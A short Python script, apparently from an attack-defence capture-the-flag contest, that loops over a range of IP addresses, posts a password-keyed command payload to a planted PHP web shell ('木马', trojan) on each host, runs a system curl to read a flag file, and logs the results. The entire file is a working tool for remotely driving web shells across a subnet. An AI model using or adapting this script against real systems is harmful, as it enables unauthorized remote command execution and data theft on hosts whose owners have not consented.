#coding=utf-8
import requests
url_head="http://XX.XX.XX."    #网段
url=""
shell_addr="/XX.php"
passwd="XX"                    #木马密码
port="88"
payload =  {passwd: 'system(\'curl localhost:88/flag.txt\');'}

flag=open("firstround_flag.txt","a")

for i in range(93,97):
    url=url_head+str(i)+":"+port+shell_addr
    try:
        res=requests.post(url,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            result = url+" connect shell sucess,flag is "+res.text
            print(result)
            flag.write(url_head[7:]+str(i)+"\t"+res.text+"\n")
        else:
            print ("shell 404")
    except:
        print(url+" connect shell fail")

flag.close()